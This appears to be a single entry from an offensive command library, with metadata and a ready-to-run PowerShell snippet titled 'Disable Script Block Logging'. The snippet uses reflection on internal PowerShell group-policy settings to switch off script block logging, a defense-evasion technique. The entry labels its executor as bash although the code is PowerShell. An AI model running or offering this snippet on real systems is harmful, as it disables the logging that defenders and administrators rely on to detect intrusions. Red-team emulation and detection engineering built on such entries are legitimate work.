---
id: f0fb73d4-56a8-4095-b808-3a490867e759
name: Disable Script Block Logging
type: command
executor: bash
data: $settings = [Ref].Assembly.GetType(\"System.Management.Automation.Utils\").GetField(\"cachedGroupPolicySettings\",\"NonPublic,Static\").GetValue($null);\n$settings[\"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\"]
  = @{}\n$settings[\"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\"].Add(\"EnableScriptBlockLogging\",
  \"0\")
output: null
created_at: '2023-04-06T03:56:25.973679+00:00'
updated_at: '2023-04-10T20:36:17.635356+00:00'
---

# Disable Script Block Logging

```bash
$settings = [Ref].Assembly.GetType(\"System.Management.Automation.Utils\").GetField(\"cachedGroupPolicySettings\",\"NonPublic,Static\").GetValue($null);\n$settings[\"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\"] = @{}\n$settings[\"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\"].Add(\"EnableScriptBlockLogging\", \"0\")
```
